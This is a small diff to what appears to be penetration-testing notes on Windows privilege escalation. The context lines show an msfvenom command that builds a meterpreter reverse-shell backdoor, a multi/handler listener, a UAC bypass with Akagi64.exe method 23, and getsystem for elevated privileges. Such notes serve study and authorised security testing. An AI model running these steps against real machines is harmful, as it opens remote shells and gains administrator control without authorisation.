@@ -32,7 +32,7 @@ Note: if you have a valid user credential you can authenticate in windows target
   3. Create payload with msfvenom
      - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe`
   5. Use exploit/multi/handler to start a listener
-  6. Akagi64.exe 23 <payload_full_path>
+  6. `Akagi64.exe 23 <payload_full_path>`
      - **NOTE FULL PATH**
   7. Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
 
